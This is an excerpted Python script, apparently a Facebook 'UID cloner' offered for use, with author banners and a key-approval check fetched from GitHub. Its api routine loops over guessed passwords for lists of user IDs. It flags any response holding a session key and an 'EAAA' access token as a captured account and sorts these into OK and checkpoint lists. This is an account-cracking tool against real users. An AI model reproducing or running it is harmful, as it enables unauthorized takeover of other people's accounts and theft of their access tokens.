...
import time
os.system("clear")
print("  ==> \033[1;32mHOWDY ITS SABBIR BECOME DREAM A PROGRAMMER ")
time.sleep(5)
...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/Toxic-Ayan/just-now/blob/main/Approved.txt"])
	exit(" [*] FB GROUP : https://facebook.com/groups/1215404685982268/ ")
...
def notice():
	...
	runtxt("\033[0;93m JOIN THE GROUP AND COMMENT YOUR KEY GROUP POST JUSST NOW APPROVE\033[0;96m FREE APPROVAL>> %s%s"%(G,basesplit))
	runtxt("\033[0;92m BYPASS ADMIN FACEBOOK >> https://www.facebook.com/Alcohol.Ayan02")
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/Toxic-Ayan/just-now/blob/main/Approved.txt').text
			if basesplit in plr:
				key = basesplit
		...
		print("\n"+C+".___________.  ______   ___   ___  __    ______ \n|           | /  __  \  \  \ /  / |  |  /      | "+Y+"|AYAN"+C+"\n`---|  |----`|  |  |  |  \  V  /  |  | |  ,----' "+Y+"|SAGOR"+C+"\n    |  |     |  |  |  |   >   <   |  | |  | "+Y+""+C+"\n    |  |     |  `--'  |  /  .  \  |  | |  `----.\n    |__|      \______/  /__/ \__\ |__|  \______|\ "+N+"──────────────────────────────────────────────────"+G+"\n▸ AUTHOR     : AYAN SAGOR\n▸ FACEBOOK   : FACEBOOK.COM/Alchol.Ayan02\n▸ WHATTSAPP  : +8801726742018\n▸ GITHUB     : GITHUB.COM/Toxic-Ayan\n"+N+"─────────────────────────────────────────────────\n")
		...
		runtxt("\n    \033[0;92m <=======    AYAN 𝐔𝐈𝐃 𝐂𝐋𝐎𝐍𝐄𝐑    =======>  \033[0;97m ")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [AY4N] : %s/%s -> \033[0;92m [ BY-OK:%s ]- \033[0;91m[BY-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r  \033[0;91m   [AYAN-CP] %s | %s\033[0;97m         "%(uid, pw))
